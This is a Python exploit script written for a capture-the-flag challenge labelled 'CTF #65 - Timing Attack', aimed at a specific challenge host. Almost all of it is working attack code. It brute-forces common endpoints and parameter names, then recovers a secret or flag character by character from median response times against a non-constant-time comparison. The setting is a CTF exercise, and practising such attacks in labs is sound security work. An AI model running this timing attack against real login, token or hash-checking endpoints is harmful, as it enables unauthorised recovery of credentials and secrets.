#!/usr/bin/env python3
"""
CTF #65 - Timing Attack
Exploits non-constant time hash comparison to extract the secret character by character.

Usage:
    python3 ctf65_timing_attack.py

Adjust TARGET_URL to match the challenge endpoint.
"""

import requests
import time
import string
import sys

TARGET_URL = "http://paris.hackdevinci.com:8065"

# Possible characters in the secret/hash (adjust if needed)
CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_-{}"
SAMPLES = 20       # Number of requests per character to average timing
SECRET_LEN = 40    # Max length to try (SHA1=40, MD5=32, flag=variable)


def discover_endpoint():
    """Try to discover the correct endpoint and parameter."""
    session = requests.Session()

    # Try common endpoints
    endpoints = [
        "/",
        "/check",
        "/verify",
        "/login",
        "/flag",
        "/api/check",
        "/api/verify",
        "/hash",
        "/secret",
    ]

    print("[*] Discovering endpoint...")
    for ep in endpoints:
        try:
            r = session.get(f"{TARGET_URL}{ep}", timeout=5)
            print(f"  GET {ep} -> {r.status_code} | {r.text[:200]}")
        except Exception as e:
            print(f"  GET {ep} -> Error: {e}")

    # Also try POST
    for ep in ["/", "/check", "/verify", "/login"]:
        for param in ["secret", "hash", "password", "key", "token", "flag", "input"]:
            try:
                r = session.post(f"{TARGET_URL}{ep}", data={param: "test"}, timeout=5)
                if r.status_code != 404:
                    print(f"  POST {ep} param={param} -> {r.status_code} | {r.text[:200]}")
            except Exception as e:
                pass

    return session


def time_request(session, endpoint, param_name, value, method="POST"):
    """Send a request and measure response time."""
    times = []
    for _ in range(SAMPLES):
        start = time.perf_counter()
        try:
            if method == "POST":
                r = session.post(f"{TARGET_URL}{endpoint}", data={param_name: value}, timeout=10)
            elif method == "GET":
                r = session.get(f"{TARGET_URL}{endpoint}", params={param_name: value}, timeout=10)
            elif method == "JSON":
                r = session.post(f"{TARGET_URL}{endpoint}", json={param_name: value}, timeout=10)
        except:
            continue
        elapsed = time.perf_counter() - start
        times.append(elapsed)

    if not times:
        return 0
    # Use median to reduce noise
    times.sort()
    mid = len(times) // 2
    return times[mid]


def timing_attack(session, endpoint="/", param_name="secret", method="POST", charset=None):
    """
    Perform the timing attack character by character.
    """
    if charset is None:
        charset = CHARSET

    found = ""
    print(f"\n[*] Starting timing attack on {endpoint} (param={param_name}, method={method})")
    print(f"[*] Charset: {charset[:20]}... ({len(charset)} chars)")
    print(f"[*] Samples per char: {SAMPLES}")
    print()

    for pos in range(SECRET_LEN):
        best_char = None
        best_time = 0
        results = []

        for c in charset:
            candidate = found + c + "0" * (SECRET_LEN - len(found) - 1)
            avg_time = time_request(session, endpoint, param_name, candidate, method)
            results.append((c, avg_time))

            if avg_time > best_time:
                best_time = avg_time
                best_char = c

        # Sort by time to see the distribution
        results.sort(key=lambda x: x[1], reverse=True)
        top3 = results[:3]

        found += best_char

        # Check if there's a significant timing difference
        if len(results) > 1:
            ratio = results[0][1] / results[1][1] if results[1][1] > 0 else 1
        else:
            ratio = 1

        print(f"[+] Position {pos:2d}: '{best_char}' (time={best_time*1000:.2f}ms, "
              f"ratio={ratio:.3f}) | Top3: {[(c, f'{t*1000:.2f}ms') for c, t in top3]}")
        print(f"    Current: {found}")

        # If ratio is very close to 1, we might have found the full secret
        if ratio < 1.01 and pos > 5:
            print(f"\n[!] Ratio dropped below threshold at position {pos}. Possible end of secret.")
            # Try submitting what we have
            test = time_request(session, endpoint, param_name, found, method)
            print(f"[!] Testing '{found}': {test*1000:.2f}ms")
            break

    return found


def main():
    print("=" * 60)
    print("  CTF #65 - Timing Attack Exploit")
    print("  Target: " + TARGET_URL)
    print("=" * 60)

    # Phase 1: Discover endpoints
    session = discover_endpoint()

    print("\n" + "=" * 60)
    print("  Based on discovery, configure the attack below.")
    print("  Edit ENDPOINT, PARAM_NAME, METHOD as needed.")
    print("=" * 60)

    # Phase 2: Run timing attack
    # Common configurations - uncomment the right one based on discovery:

    # Config 1: POST with form data
    ENDPOINT = "/"
    PARAM_NAME = "secret"
    METHOD = "POST"

    # Config 2: GET with query param
    # ENDPOINT = "/check"
    # PARAM_NAME = "hash"
    # METHOD = "GET"

    # Config 3: POST with JSON
    # ENDPOINT = "/verify"
    # PARAM_NAME = "token"
    # METHOD = "JSON"

    # For hex hash (MD5/SHA1), use only hex charset
    # hex_charset = "0123456789abcdef"
    # result = timing_attack(session, ENDPOINT, PARAM_NAME, METHOD, charset=hex_charset)

    # For flag format CTF{...}
    flag_charset = string.ascii_letters + string.digits + "_{}-!@#$%"
    result = timing_attack(session, ENDPOINT, PARAM_NAME, METHOD, charset=flag_charset)

    print(f"\n{'=' * 60}")
    print(f"  Result: {result}")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
